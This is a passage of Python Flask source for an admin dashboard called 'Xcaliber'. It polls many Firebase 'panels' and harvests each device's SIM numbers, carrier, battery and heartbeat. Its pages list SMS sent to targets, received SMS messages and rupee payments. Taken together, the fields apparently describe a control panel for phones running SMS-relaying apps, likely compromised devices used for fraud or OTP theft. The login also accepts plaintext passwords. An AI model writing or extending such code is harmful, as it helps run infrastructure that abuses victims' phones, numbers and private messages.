                    hb_val or
                    cdata.get("lastSeen") or cdata.get("last_seen") or cdata.get("lastOnline") or cdata.get("last_online") or
                    cdata.get("lastActive") or cdata.get("last_active") or cdata.get("timestamp") or cdata.get("time") or
                    cdata.get("dateTime") or cdata.get("updatedAt") or cdata.get("updated_at")
                )

                ts = None
                if raw_last_seen:
                    try:
                        ts = float(raw_last_seen)
                        if ts < 1e12:
                            ts = ts * 1000
                    except (ValueError, TypeError):
                        ts = None

                now_ms = time.time() * 1000
                if ts:
                    is_online = bool(raw_status) and (now_ms - ts < 300000)
                else:
                    is_online = bool(raw_status)

                if is_online:
                    total_online += 1

                mobno = _extract_device_number(cdata)
                battery = cdata.get("battery", "?")
                sims = cdata.get("sims", [])
                sim_info = ""
                dev_nums = []

                if mobno and str(mobno).strip() and str(mobno).strip() not in ("-", "null", "None", "0"):
                    dev_nums.append(str(mobno).strip())

                if isinstance(sims, list):
                    for s in sims:
                        if isinstance(s, dict):
                            sp = s.get("service_provider") or s.get("carrier") or ""
                            sn = s.get("number") or s.get("phone") or ""
                            if sp or sn:
                                sim_info += f"{sp} {sn} | "
                            if sn and str(sn).strip() and str(sn).strip() not in ("-", "null", "None", "0"):
                                if str(sn).strip() not in dev_nums:
                                    dev_nums.append(str(sn).strip())

                if dev_nums:
                    total_numbers += len(dev_nums)
                    if is_online:
                        total_online_numbers += len(dev_nums)

                all_devices.append({
                    "id": cid,
                    "panel": panel["name"],
                    "panel_url": panel["url"].rstrip("/"),
                    "number": mobno,
                    "battery": battery,
                    "sim_info": sim_info.rstrip(" | ") if sim_info else "-",
                    "webhook_ready": bool(cdata.get("webhookEvent")),
                    "is_online": is_online,
                    "hb_ts": ts or 0,
                })



        LIVE_CACHE["online_devices"] = all_devices

        LIVE_CACHE["total_panels"] = total_panels

        LIVE_CACHE["working_panels"] = working

        LIVE_CACHE["total_devices"] = total_devices

        LIVE_CACHE["total_online"] = total_online

        LIVE_CACHE["total_numbers"] = total_numbers

        LIVE_CACHE["total_online_numbers"] = total_online_numbers

        LIVE_CACHE["last_update"] = datetime.now().isoformat()



        PROBE_CACHE["last_run"] = datetime.now().isoformat()

        PROBE_CACHE["results"] = {

            "panels": {"total": total_panels, "active": total_panels, "working": working},

            "devices": {"total": total_devices, "online": total_online},

            "numbers": {"total": total_numbers, "online": total_online_numbers},

        }



        log.info("Probe complete: %d/%d panels working, %d total devices, %d online", working, total_panels, total_devices, total_online)



        try:

            pg.execute_write("UPDATE settings SET value = %s WHERE key = 'last_probe'", (datetime.now().isoformat(),))

        except Exception:

            pass



    finally:

        LIVE_CACHE["probe_running"] = False





def _run_background_probe_sync(panels):

    """Sync fallback probe using urllib if httpx is unavailable."""

    all_devices = []

    working = 0

    total_devices = 0

    total_online = 0

    total_numbers = 0

    total_online_numbers = 0

    failed = 0

    total_panels = len(panels)



    def _probe_one_panel(p):

        url = p.get("url", "")

        auth = p.get("auth_key", "")

        if not url:

            return p, {}

        clients_url = url.rstrip("/")

        if auth:

            sep = "&" if "?" in clients_url else "?"

            clients_url = f"{clients_url}/clients.json{sep}auth={auth}"

        else:

            clients_url = f"{clients_url}/clients.json"

        clients_url += f"&_cb={int(time.time()*1000)}"

        try:

            req = urllib.request.Request(clients_url, headers={"Accept": "application/json"})

            with urllib.request.urlopen(req, timeout=15) as resp:

                return p, json.loads(resp.read().decode())

        except Exception:

            return p, {}



    with ThreadPoolExecutor(max_workers=10) as executor:

        futures = {executor.submit(_probe_one_panel, p): p for p in panels}

        for future in as_completed(futures):

            try:

                panel, clients = future.result()

                if not clients or not isinstance(clients, dict):

                    failed += 1

                    continue

                working += 1

                for cid, cdata in clients.items():

                    if not isinstance(cdata, dict):

                        continue

                    total_devices += 1

                    raw_status = cdata.get("status")

                    hb_val = (
                        cdata.get("heartbeat", {}).get("timestamp") if isinstance(cdata.get("heartbeat"), dict)
                        else cdata.get("webhookEvent", {}).get("dozeHeartbeat") if isinstance(cdata.get("webhookEvent"), dict)
                        else None
                    )
                    raw_last_seen = (
                        hb_val or
                        cdata.get("lastSeen") or cdata.get("last_seen") or cdata.get("lastOnline") or cdata.get("last_online") or
                        cdata.get("lastActive") or cdata.get("last_active") or cdata.get("timestamp") or cdata.get("time") or
                        cdata.get("dateTime") or cdata.get("updatedAt") or cdata.get("updated_at")
                    )

                    ts = None
                    if raw_last_seen:
                        try:
                            ts = float(raw_last_seen)
                            if ts < 1e12:
                                ts = ts * 1000
                        except (ValueError, TypeError):
                            ts = None

                    now_ms = time.time() * 1000
                    if ts:
                        is_online = bool(raw_status) and (now_ms - ts < 300000)
                    else:
                        is_online = bool(raw_status)

                    if is_online:
                        total_online += 1

                    mobno = _extract_device_number(cdata)
                    battery = cdata.get("battery", "?")
                    sims = cdata.get("sims", [])
                    sim_info = ""
                    dev_nums = []

                    if mobno and str(mobno).strip() and str(mobno).strip() not in ("-", "null", "None", "0"):
                        dev_nums.append(str(mobno).strip())

                    if isinstance(sims, list):
                        for s in sims:
                            if isinstance(s, dict):
                                sp = s.get("service_provider") or s.get("carrier") or ""
                                sn = s.get("number") or s.get("phone") or ""
                                if sp or sn:
                                    sim_info += f"{sp} {sn} | "
                                if sn and str(sn).strip() and str(sn).strip() not in ("-", "null", "None", "0"):
                                    if str(sn).strip() not in dev_nums:
                                        dev_nums.append(str(sn).strip())

                    if dev_nums:
                        total_numbers += len(dev_nums)
                        if is_online:
                            total_online_numbers += len(dev_nums)

                    all_devices.append({
                        "id": cid,
                        "panel": panel["name"],
                        "panel_url": panel["url"].rstrip("/"),
                        "number": mobno,
                        "battery": battery,
                        "sim_info": sim_info.rstrip(" | ") if sim_info else "-",
                        "webhook_ready": bool(cdata.get("webhookEvent")),
                        "is_online": is_online,
                        "hb_ts": ts or 0,
                    })

            except Exception:

                failed += 1

                continue



    LIVE_CACHE["online_devices"] = all_devices

    LIVE_CACHE["total_panels"] = total_panels

    LIVE_CACHE["working_panels"] = working

    LIVE_CACHE["total_devices"] = total_devices

    LIVE_CACHE["total_online"] = total_online

    LIVE_CACHE["total_numbers"] = total_numbers

    LIVE_CACHE["total_online_numbers"] = total_online_numbers

    LIVE_CACHE["last_update"] = datetime.now().isoformat()



    PROBE_CACHE["last_run"] = datetime.now().isoformat()

    PROBE_CACHE["results"] = {

        "panels": {"total": total_panels, "active": total_panels, "working": working},

        "devices": {"total": total_devices, "online": total_online},

        "numbers": {"total": total_numbers, "online": total_online_numbers},

    }

    log.info("Sync probe complete: %d/%d panels working, %d total devices, %d online", working, total_panels, total_devices, total_online)





def run_probe():

    """Manual probe trigger - runs synchronously and also updates LIVE_CACHE."""

    _run_background_probe()





# ─── Auth  ────────────────────────────────────────────────────────────────



def login_required(f):

    @wraps(f)

    def wrapper(*args, **kwargs):

        if not session.get("admin_logged"):

            return redirect(url_for("login"))

        return f(*args, **kwargs)

    return wrapper





def admin_authenticate(username, password):
    h = hashlib.sha256(password.encode()).hexdigest()
    row = pg.execute_one(
        "SELECT * FROM admin WHERE username = %s AND (password = %s OR password = %s)",
        (username, h, password),
        dict_cursor=True,
    )
    if row:
        return row
    return None





@app.route("/probe-devices", methods=["POST"])

@login_required

def probe_devices():

    try:

        run_probe()

        flash(f"Probe complete: {PROBE_CACHE['results']['devices']['online']} devices online", "success")

    except Exception as e:

        flash(f"Probe failed: {str(e)}", "error")

    return redirect(url_for("devices_list"))





@app.route("/probe-numbers", methods=["POST"])

@login_required

def probe_numbers():

    try:

        run_probe()

        flash(f"Probe complete: {PROBE_CACHE['results']['numbers']['online']} numbers online", "success")

    except Exception as e:

        flash(f"Probe failed: {str(e)}", "error")

    return redirect(url_for("numbers_list"))





LOGIN_PAGE = """

<!DOCTYPE html>

<html lang="en">

<head>

  <meta charset="UTF-8">

  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <title>Xcaliber - Login</title>

  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">

  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">

  <style>

    * { margin:0; padding:0; box-sizing:border-box; }

    body { font-family:'Inter',system-ui,sans-serif; background:#f0f4f8; color:#1e293b; display:flex; justify-content:center; align-items:center; min-height:100vh; }

    .login-wrapper { width:420px; max-width:95%; }

    .login-card { background:#fff; border:1px solid #e2e8f0; border-radius:20px; padding:48px 40px; box-shadow:0 4px 24px rgba(0,0,0,0.06),0 1px 4px rgba(0,0,0,0.04); }

    .login-logo { text-align:center; margin-bottom:36px; }

    .login-logo .icon-wrap { width:72px; height:72px; border-radius:20px; background:linear-gradient(135deg,#0ea5e9,#d4a853); display:inline-flex; align-items:center; justify-content:center; margin-bottom:16px; box-shadow:0 6px 20px rgba(14,165,233,0.25) }

    .login-logo .icon-wrap i { font-size:30px; color:#fff }

    .login-logo h2 { font-size:26px; font-weight:800; background:linear-gradient(135deg,#0ea5e9,#d4a853); -webkit-background-clip:text; -webkit-text-fill-color:transparent }

    .login-logo p { color:#64748b; font-size:13px; margin-top:6px; font-weight:500 }

    .form-group { margin-bottom:20px }

    .form-group label { display:block; font-size:12px; color:#64748b; margin-bottom:6px; font-weight:600; text-transform:uppercase; letter-spacing:0.3px }

    .form-group input { width:100%; padding:13px 16px; background:#f8fafc; border:1.5px solid #cbd5e1; border-radius:10px; color:#1e293b; font-size:14px; outline:none; transition:all .2s; font-family:inherit }

    .form-group input:focus { border-color:#0ea5e9; box-shadow:0 0 0 3px rgba(14,165,233,0.12); background:#fff }

    .btn { width:100%; padding:14px; background:linear-gradient(135deg,#0ea5e9,#38bdf8); color:#fff; border:none; border-radius:10px; font-size:15px; font-weight:700; cursor:pointer; transition:all .2s; font-family:inherit; box-shadow:0 3px 12px rgba(14,165,233,0.3) }

    .btn:hover { transform:translateY(-2px); box-shadow:0 6px 24px rgba(14,165,233,0.4) }

    .flash { padding:12px 16px; border-radius:10px; margin-bottom:18px; font-size:13px; font-weight:500; background:rgba(239,68,68,0.08); color:#dc2626; border:1px solid rgba(239,68,68,0.2); display:flex; align-items:center; gap:8px }

    .login-footer { text-align:center; margin-top:20px; font-size:12px; color:#94a3b8 }

  </style>

</head>

<body>

  <div class="login-wrapper">

    <div class="login-card">

      <div class="login-logo">

        <div class="icon-wrap"><i class="fas fa-bolt"></i></div>

        <h2>Xcaliber</h2>

        <p>Sign in to your admin dashboard</p>

      </div>

      {% with messages = get_flashed_messages() %}

        {% for msg in messages %}<div class="flash"><i class="fas fa-exclamation-circle"></i> {{ msg }}</div>{% endfor %}

      {% endwith %}

      <form method="POST" action="/login">

        <input type="hidden" name="_csrf_token" value="{{ csrf_token() }}">

        <div class="form-group">

          <label>Username</label>

          <input type="text" name="username" placeholder="Enter your username" required autofocus>

        </div>

        <div class="form-group">

          <label>Password</label>

          <input type="password" name="password" placeholder="Enter your password" required>

        </div>

        <button type="submit" class="btn"><i class="fas fa-sign-in-alt"></i> Sign In</button>

      </form>

    </div>

    <div class="login-footer">Xcaliber Premium Admin Panel</div>

  </div>

</body>

</html>

"""



DASHBOARD_PAGE = """

<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:28px">

  <h1 style="margin:0"><i class="fas fa-chart-line accent"></i> <span class="accent">Dashboard</span> <span class="gold">Overview</span></h1>

  <div style="display:flex;gap:10px;align-items:center">

    <span id="liveDot" style="font-size:12px;color:#22c55e;font-weight:600"><i class="fas fa-circle" style="animation:pulse 1.5s infinite"></i> Live</span>

    <a href="/databases" class="btn btn-accent btn-sm"><i class="fas fa-database"></i> Manage Panels</a>

    <form method="POST" action="/auto-sync" style="display:inline">

      <button type="submit" class="btn btn-gold btn-sm"><i class="fas fa-sync"></i> Auto Sync</button>

    </form>

    <a href="/settings" class="btn btn-outline btn-sm"><i class="fas fa-cog"></i> Settings</a>

  </div>

</div>



<style>

@keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.3} }

.live-flash { animation: flashBg 0.6s ease; }

@keyframes flashBg { 0%{background:rgba(14,165,233,0.15)} 100%{background:transparent} }

</style>



<div class="stats-grid">

  <div class="stat-card sblue" id="st-panels-total">

    <div class="icon"><i class="fas fa-database"></i></div>

    <div class="value">{{ stats.panels_total }}</div>

    <div class="label">Total Panels</div>

  </div>

  <div class="stat-card sgreen" id="st-panels-active">

    <div class="icon"><i class="fas fa-check-circle"></i></div>

    <div class="value">{{ stats.panels_active }}</div>

    <div class="label">Active Panels</div>

  </div>

  <div class="stat-card sblue" id="st-panels-working">

    <div class="icon"><i class="fas fa-heartbeat"></i></div>

    <div class="value">{{ stats.panels_working }}</div>

    <div class="label">Working Panels</div>

  </div>

  <div class="stat-card sgold" id="st-devices-total">

    <div class="icon"><i class="fas fa-mobile-alt"></i></div>

    <div class="value">{{ stats.devices_total }}</div>

    <div class="label">Total Devices</div>

  </div>

  <div class="stat-card sgreen" id="st-devices-online">

    <div class="icon"><i class="fas fa-signal"></i></div>

    <div class="value">{{ stats.devices_online }}</div>

    <div class="label">Online Devices</div>

  </div>

  <div class="stat-card sblue" id="st-numbers-total">

    <div class="icon"><i class="fas fa-hashtag"></i></div>

    <div class="value">{{ stats.numbers_total }}</div>

    <div class="label">Total Numbers</div>

  </div>

  <div class="stat-card sgold" id="st-numbers-online">

    <div class="icon"><i class="fas fa-phone-alt"></i></div>

    <div class="value">{{ stats.numbers_online }}</div>

    <div class="label">Online Numbers</div>

  </div>

  <div class="stat-card sblue" id="st-users">

    <div class="icon"><i class="fas fa-users"></i></div>

    <div class="value">{{ stats.users }}</div>

    <div class="label">Total Users</div>

  </div>

  <div class="stat-card sgreen" id="st-sms">

    <div class="icon"><i class="fas fa-paper-plane"></i></div>

    <div class="value">{{ stats.sms }}</div>

    <div class="label">SMS Sent</div>

  </div>

  <div class="stat-card sgold" id="st-revenue">

    <div class="icon"><i class="fas fa-rupee-sign"></i></div>

    <div class="value">{{ stats.revenue }}</div>

    <div class="label">Revenue (INR)</div>

  </div>

  <div class="stat-card sred" id="st-inactive">

    <div class="icon"><i class="fas fa-ban"></i></div>

    <div class="value">{{ stats.inactive_panels }}</div>

    <div class="label">Inactive Panels</div>

  </div>

  <div class="stat-card sblue" id="st-probe-time">

    <div class="icon"><i class="fas fa-clock"></i></div>

    <div class="value" style="font-size:16px">{{ stats.probe_time or 'Never' }}</div>

    <div class="label">Last Probe</div>

  </div>

</div>



<div style="display:grid;grid-template-columns:1fr 1fr;gap:20px">

<div class="card">

  <div class="card-header"><h2><i class="fas fa-clock"></i> Recent SMS Logs</h2> <span style="font-size:11px;color:#22c55e;font-weight:600">● LIVE</span></div>

  <div class="card-body" style="overflow-x:auto;padding:0">

    <table>

      <thead><tr><th>User</th><th>Target</th><th>Panel</th><th>Status</th><th>Time</th></tr></thead>

      <tbody id="liveLogs">

        {% for log in recent_logs %}

        <tr>

          <td>{{ log.user_id }}</td>

          <td>{{ log.target }}</td>

          <td class="truncate">{{ log.panel }}</td>

          <td><span class="badge badge-{{ 'green' if log.status == 'sent' else 'red' }}">{{ log.status }}</span></td>

          <td>{{ log.created_at[:16] if log.created_at else '-' }}</td>

        </tr>

        {% endfor %}

        {% if not recent_logs %}

        <tr><td colspan="5" style="text-align:center;color:#94a3b8;padding:28px">No SMS logs yet</td></tr>

        {% endif %}

      </tbody>

    </table>

  </div>

</div>



<div class="card">

  <div class="card-header"><h2><i class="fas fa-inbox"></i> Received SMS</h2> <span style="font-size:11px;color:#22c55e;font-weight:600">● LIVE</span></div>

  <div class="card-body" style="overflow-x:auto;padding:0">

    <table>

      <thead><tr><th>Number</th><th>Message</th><th>Panel</th><th>Time</th></tr></thead>

      <tbody id="liveReceived">

        <tr><td colspan="4" style="text-align:center;color:#94a3b8;padding:28px">Loading...</td></tr>

      </tbody>

    </table>

  </div>

</div>

</div>



<div class="card" style="margin-top:20px">

  <div class="card-header"><h2><i class="fas fa-credit-card"></i> Recent Payments</h2> <span style="font-size:11px;color:#22c55e;font-weight:600">● LIVE</span></div>

  <div class="card-body" style="overflow-x:auto;padding:0">

    <table>

      <thead><tr><th>UTR</th><th>Amount</th><th>Payer</th><th>VPA</th><th>Time</th></tr></thead>

      <tbody id="livePayments">

        {% for p in recent_payments %}

        <tr>

          <td>{{ p.biz_order_id }}</td>

          <td style="font-weight:600;color:#d4a853">₹{{ '%.2f'|format(p.amount|float) }}</td>

          <td>{{ p.payer_name or '-' }}</td>

          <td>{{ p.payer_vpa or '-' }}</td>

          <td>{{ p.created_at[:16] if p.created_at else '-' }}</td>

        </tr>

        {% endfor %}

        {% if not recent_payments %}

        <tr><td colspan="5" style="text-align:center;color:#94a3b8;padding:28px">No payments yet</td></tr>

        {% endif %}

      </tbody>

    </table>

  </div>

</div>



<script>

function flashCard(el){

  el.classList.remove('live-flash');

  void el.offsetWidth;

  el.classList.add('live-flash');

}

function updateVal(id, val, el){

  var e=document.getElementById(id);

  if(!e)return;

  var v=e.querySelector('.value');

  if(v && v.textContent!=String(val)){v.textContent=val;flashCard(el||e);}

}

async function refreshStats(){

  try{

    var r=await fetch('/api/dashboard-stats');if(!r.ok)return;var d=await r.json();

    updateVal('st-panels-total',d.panels_total);

    updateVal('st-panels-active',d.panels_active);

    updateVal('st-panels-working',d.panels_working);

    updateVal('st-devices-total',d.devices_total);

    updateVal('st-devices-online',d.devices_online);

    updateVal('st-numbers-total',d.numbers_total);

    updateVal('st-numbers-online',d.numbers_online);

    updateVal('st-users',d.users);

    updateVal('st-sms',d.sms);

    updateVal('st-revenue',d.revenue);

    updateVal('st-inactive',d.inactive_panels);

  }catch(e){}

}

async function refreshLogs(){

  try{

    var r=await fetch('/api/live-logs');if(!r.ok)return;var d=await r.json();

    var tb=document.getElementById('liveLogs');if(!tb)return;

    if(d.length===0){tb.innerHTML='<tr><td colspan="5" style="text-align:center;color:#94a3b8;padding:28px">No logs</td></tr>';return;}

    var h='';d.forEach(function(l){

      var sc=l.status==='sent'?'green':'red';

      h+='<tr><td>'+escapeHtml(l.user_id)+'</td><td>'+escapeHtml(l.target)+'</td><td class="truncate">'+escapeHtml(l.panel)+'</td><td><span class="badge badge-'+sc+'">'+escapeHtml(l.status)+'</span></td><td>'+escapeHtml(l.created_at)+'</td></tr>';

    });tb.innerHTML=h;

  }catch(e){}

}

async function refreshReceived(){

  try{

    var r=await fetch('/api/live-received');if(!r.ok)return;var d=await r.json();

    var tb=document.getElementById('liveReceived');if(!tb)return;

    if(d.length===0){tb.innerHTML='<tr><td colspan="4" style="text-align:center;color:#94a3b8;padding:28px">No received SMS</td></tr>';return;}

    var h='';d.forEach(function(l){

      h+='<tr><td>'+escapeHtml(l.number)+'</td><td class="truncate">'+escapeHtml(l.message)+'</td><td>'+escapeHtml(l.panel)+'</td><td>'+escapeHtml(l.received_at)+'</td></tr>';

    });tb.innerHTML=h;

  }catch(e){}

}

async function refreshPayments(){

  try{

    var r=await fetch('/api/live-payments');if(!r.ok)return;var d=await r.json();

    var tb=document.getElementById('livePayments');if(!tb)return;

    if(d.length===0){tb.innerHTML='<tr><td colspan="5" style="text-align:center;color:#94a3b8;padding:28px">No payments</td></tr>';return;}

    var h='';d.forEach(function(p){

      h+='<tr><td>'+escapeHtml(p.biz_order_id)+'</td><td style="font-weight:600;color:#d4a853">₹'+escapeHtml(String(p.amount))+'</td><td>'+escapeHtml(p.payer_name)+'</td><td>'+escapeHtml(p.payer_vpa)+'</td><td>'+escapeHtml(p.created_at)+'</td></tr>';

    });tb.innerHTML=h;

  }catch(e){}

}

setInterval(function(){refreshStats();refreshLogs();refreshReceived();refreshPayments();},8000);

</script>

"""



DATABASES_PAGE = """

<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:28px">

  <h1 style="margin:0"><i class="fas fa-database accent"></i> <span class="accent">Firebase</span> <span class="gold">Panels</span></h1>

  <div style="display:flex;gap:10px;align-items:center">

    <span style="font-size:13px;color:#64748b;font-weight:500"><i class="fas fa-circle" style="color:#22c55e;font-size:8px"></i> {{ panels|length }} panels loaded</span>

    <form method="POST" action="/databases/normalize" style="display:inline" onsubmit="return confirm('Normalize all URLs? Invalid ones will be removed.')">

      <button type="submit" class="btn btn-outline btn-sm" title="Fix all URL formats, remove invalid"><i class="fas fa-magic"></i> Normalize URLs</button>

    </form>

  </div>

</div>



<div class="card" style="margin-bottom:20px">

  <div class="card-header"><h2><i class="fas fa-plus-circle"></i> Add Panel</h2></div>

  <div class="card-body">

    <form method="POST" action="/databases/add" class="form-row">

      <div class="form-group" style="flex:2;min-width:200px">

        <label>Firebase Panel URL (any format: *.firebaseio.com or *.firebasedatabase.app)</label>

        <input type="text" name="url" class="input" placeholder="https://xxx-default-rtdb.firebaseio.com" required>

      </div>

      <div class="form-group" style="flex:1;min-width:150px">

        <label>Panel Name (optional - auto-derived from URL)</label>

        <input type="text" name="name" class="input" placeholder="Auto">

      </div>

      <div style="display:flex;align-items:flex-end">

        <button type="submit" class="btn btn-accent"><i class="fas fa-plus"></i> Add Panel</button>

      </div>

    </form>

  </div>

</div>



<div class="card" style="margin-bottom:20px">

  <div class="card-header"><h2><i class="fas fa-layer-group"></i> Bulk Add Panels</h2></div>

  <div class="card-body">

    <form method="POST" action="/databases/bulk-add">

      <div class="form-group">

        <label>Paste Firebase URLs (one per line). All formats accepted. Name auto-extracted.</label>

        <textarea name="bulk_urls" class="input" rows="6" placeholder="https://xxx-default-rtdb.firebaseio.com&#10;https://yyy-default-rtdb.us-central1.firebasedatabase.app&#10;xxx-default-rtdb.firebaseio.com"></textarea>

      </div>

      <button type="submit" class="btn btn-gold"><i class="fas fa-upload"></i> Bulk Add All</button>

    </form>

  </div>

</div>



<div class="bulk-bar" id="bulkBar">

  <span class="count"><span id="bulkCount">0</span> selected</span>

  <button class="btn btn-danger btn-sm" onclick="bulkDelete()"><i class="fas fa-trash"></i> Delete Selected</button>

  <button class="btn btn-outline btn-sm" onclick="clearSelection()"><i class="fas fa-times"></i> Clear</button>

</div>



<div class="card">

  <div class="card-header">

    <h2><i class="fas fa-database"></i> All Panels ({{ total_panels }})</h2>

    <div class="search-box" style="margin:0;width:260px">

      <i class="fas fa-search"></i>

      <input type="text" id="panelSearch" class="input" placeholder="Search panels by name or URL..." oninput="filterTable('panelSearch','panelTable')">

    </div>

  </div>

  <div class="card-body" style="overflow-x:auto;padding:0">

    <table id="panelTable">

      <thead>

        <tr><th class="cb-cell"><input type="checkbox" id="selectAll" onclick="toggleAll(this)"></th><th>Name</th><th>URL</th><th>Status</th><th>SMS</th><th>Added</th><th>Actions</th></tr>

      </thead>

      <tbody>

        {% for p in panels %}

        <tr>

          <td class="cb-cell"><input type="checkbox" class="panel-cb" value="{{ p.id }}" onchange="updateBulk()"></td>

          <td><strong>{{ p.name }}</strong></td>

          <td class="truncate" title="{{ p.url }}">{{ p.url[:50] }}...</td>

          <td><span class="badge badge-{{ 'green' if p.status == 'active' else 'red' }}">{{ p.status }}</span></td>

          <td>{{ p.sms_sent }}</td>

          <td>{{ p.added[:10] if p.added else '-' }}</td>

          <td style="white-space:nowrap">

            <form method="POST" action="/databases/toggle/{{ p.id }}" style="display:inline">

              <button type="submit" class="btn btn-sm btn-outline" title="Toggle"><i class="fas fa-toggle-{{ 'on' if p.status == 'active' else 'off' }}"></i></button>

            </form>

            <form method="POST" action="/databases/delete/{{ p.id }}" style="display:inline" onsubmit="return confirm('Delete this panel?')">

              <button type="submit" class="btn btn-sm btn-danger" title="Delete"><i class="fas fa-trash"></i></button>

            </form>

          </td>

        </tr>

        {% endfor %}

        {% if not panels %}

        <tr><td colspan="7" style="text-align:center;color:#94a3b8;padding:28px">No panels added yet. Add Firebase URLs above.</td></tr>

        {% endif %}

      </tbody>

    </table>

  </div>

</div>



<script>

function filterTable(sid,tid){var q=document.getElementById(sid).value.toLowerCase();document.querySelectorAll('#'+tid+' tbody tr').forEach(function(r){r.style.display=r.textContent.toLowerCase().includes(q)?'':'none'})}

function toggleAll(cb){document.querySelectorAll('.panel-cb').forEach(function(b){b.checked=cb.checked});updateBulk()}

function updateBulk(){var c=document.querySelectorAll('.panel-cb:checked').length;document.getElementById('bulkCount').textContent=c;document.getElementById('bulkBar').classList.toggle('active',c>0)}

function clearSelection(){document.querySelectorAll('.panel-cb').forEach(function(b){b.checked=false});document.getElementById('selectAll').checked=false;updateBulk()}

function bulkDelete(){var ids=[];document.querySelectorAll('.panel-cb:checked').forEach(function(b){ids.push(b.value)});if(!ids.length)return;if(!confirm('Delete '+ids.length+' selected panels?'))return;fetch('/databases/bulk-delete',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ids:ids})}).then(function(r){return r.json()}).then(function(d){if(d.ok){location.reload()}else{alert(d.error||'Failed')}})}

</script>

"""



DEVICES_PAGE = """

<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:28px">

  <h1 style="margin:0"><i class="fas fa-mobile-alt accent"></i> <span class="accent">Device</span> <span class="gold">Manager</span></h1>

  <form method="POST" action="/probe-devices" style="display:inline">

    <button type="submit" class="btn btn-accent btn-sm"><i class="fas fa-radar"></i> Run Probe</button>

  </form>

</div>



<div class="card" style="margin-bottom:20px">

  <div class="card-header"><h2><i class="fas fa-plus-circle"></i> Add Device</h2></div>

  <div class="card-body">

    <form method="POST" action="/devices/add" class="form-row">

      <div class="form-group" style="flex:1;min-width:180px">

        <label>Device ID</label>

        <input type="text" name="device_id" class="input" placeholder="device_001" required>

      </div>

      <div class="form-group" style="flex:2;min-width:200px">

        <label>Device Info</label>

        <input type="text" name="info" class="input" placeholder="Samsung Galaxy S21 - Android 12">

      </div>

      <div style="display:flex;align-items:flex-end">

        <button type="submit" class="btn btn-accent"><i class="fas fa-plus"></i> Add Device</button>

      </div>

    </form>

  </div>

</div>



<div class="card">

  <div class="card-header">

    <h2><i class="fas fa-mobile-alt"></i> All Devices ({{ total_devices }})</h2>

    <div class="search-box" style="margin:0;width:260px">

      <i class="fas fa-search"></i>

      <input type="text" id="deviceSearch" class="input" placeholder="Search devices..." oninput="filterTable('deviceSearch','deviceTable')">

    </div>

  </div>

  <div class="card-body" style="overflow-x:auto;padding:0">

    <table id="deviceTable">

      <thead><tr><th>Device ID</th><th>Info</th><th>Status</th><th>Last Seen</th><th>Actions</th></tr></thead>

      <tbody>

        {% for d in devices %}

        <tr>

          <td><strong>{{ d.device_id }}</strong></td>

          <td>{{ d.info or '-' }}</td>

          <td><span class="badge badge-{{ 'green' if d.online else 'red' }}">{{ 'Online' if d.online else 'Offline' }}</span></td>

          <td>{{ d.last_seen[:16] if d.last_seen else '-' }}</td>

          <td>

            <form method="POST" action="/devices/delete/{{ d.device_id }}" style="display:inline" onsubmit="return confirm('Remove this device?')">

              <button type="submit" class="btn btn-sm btn-danger"><i class="fas fa-trash"></i></button>

            </form>

          </td>

        </tr>

        {% endfor %}

        {% if not devices %}

        <tr><td colspan="5" style="text-align:center;color:#94a3b8;padding:28px">No devices registered</td></tr>

        {% endif %}

      </tbody>

    </table>

  </div>

</div>



<script>

function filterTable(sid,tid){var q=document.getElementById(sid).value.toLowerCase();document.querySelectorAll('#'+tid+' tbody tr').forEach(function(r){r.style.display=r.textContent.toLowerCase().includes(q)?'':'none'})}

</script>

"""



NUMBERS_PAGE = """

<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:28px">

  <h1 style="margin:0"><i class="fas fa-phone accent"></i> <span class="accent">Number</span> <span class="gold">Manager</span></h1>

  <form method="POST" action="/probe-numbers" style="display:inline">

    <button type="submit" class="btn btn-accent btn-sm"><i class="fas fa-radar"></i> Run Probe</button>

  </form>

</div>



<div class="card" style="margin-bottom:20px">

  <div class="card-header"><h2><i class="fas fa-plus-circle"></i> Add Number</h2></div>

  <div class="card-body">

    <form method="POST" action="/numbers/add" class="form-row">

      <div class="form-group" style="flex:1;min-width:180px">

        <label>Phone Number</label>

        <input type="text" name="number" class="input" placeholder="+919876543210" required>

      </div>

      <div class="form-group" style="flex:2;min-width:200px">

        <label>Number Info</label>

        <input type="text" name="info" class="input" placeholder="Airtel - Main SIM">

      </div>

      <div style="display:flex;align-items:flex-end">

        <button type="submit" class="btn btn-accent"><i class="fas fa-plus"></i> Add Number</button>

      </div>

    </form>

  </div>

</div>



<div class="card">

  <div class="card-header">

    <h2><i class="fas fa-hashtag"></i> All Numbers ({{ total_numbers }})</h2>

    <div class="search-box" style="margin:0;width:260px">

      <i class="fas fa-search"></i>

      <input type="text" id="numberSearch" class="input" placeholder="Search numbers..." oninput="filterTable('numberSearch','numberTable')">

    </div>

  </div>

  <div class="card-body" style="overflow-x:auto;padding:0">

    <table id="numberTable">

      <thead><tr><th>Number</th><th>Info</th><th>Status</th><th>Last Seen</th><th>Actions</th></tr></thead>

      <tbody>

        {% for n in numbers %}

        <tr>

          <td><strong>{{ n.number }}</strong></td>

          <td>{{ n.info or '-' }}</td>

          <td><span class="badge badge-{{ 'green' if n.online else 'red' }}">{{ 'Online' if n.online else 'Offline' }}</span></td>

          <td>{{ n.last_seen[:16] if n.last_seen else '-' }}</td>

          <td>

            <form method="POST" action="/numbers/delete/{{ n.number }}" style="display:inline" onsubmit="return confirm('Remove this number?')">

              <button type="submit" class="btn btn-sm btn-danger"><i class="fas fa-trash"></i></button>

            </form>

          </td>

        </tr>

        {% endfor %}

        {% if not numbers %}

        <tr><td colspan="5" style="text-align:center;color:#94a3b8;padding:28px">No numbers added</td></tr>

        {% endif %}

      </tbody>

    </table>

  </div>

</div>



<script>

function filterTable(sid,tid){var q=document.getElementById(sid).value.toLowerCase();document.querySelectorAll('#'+tid+' tbody tr').forEach(function(r){r.style.display=r.textContent.toLowerCase().includes(q)?'':'none'})}

</script>

"""



ONLINE_NUMBERS_PAGE = """

<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:28px">

